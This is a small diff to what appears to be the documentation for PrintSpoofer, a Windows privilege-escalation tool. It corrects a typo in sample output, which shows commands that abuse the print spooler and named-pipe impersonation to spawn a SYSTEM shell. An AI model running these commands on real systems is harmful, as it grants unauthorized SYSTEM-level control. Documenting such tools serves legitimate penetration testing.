@@ -116,7 +116,7 @@ C:\Tools>PrintSpoofer.exe -c cmd.exe
 [>] Waiting for named pipe connection.
 [+] Print spooler is triggered successfully.
 [+] Got named pipe connection.
-[+] Named pipe impersonation is succesful (SID: S-1-5-18).
+[+] Named pipe impersonation is successful (SID: S-1-5-18).
 [+] SYSTEM process is executed successfully (PID = 5148).
 [*] Done.
 ```
@@ -143,7 +143,7 @@ C:\Tools>PrintSpoofer.exe -i -c cmd
 [>] Waiting for named pipe connection.
 [+] Print spooler is triggered successfully.
 [+] Got named pipe connection.
-[+] Named pipe impersonation is succesful (SID: S-1-5-18).
+[+] Named pipe impersonation is successful (SID: S-1-5-18).
 [+] SYSTEM process is executed successfully (PID = 7504).
 Microsoft Windows [Version 10.0.18362.175]
 (c) 2019 Microsoft Corporation. All rights reserved.
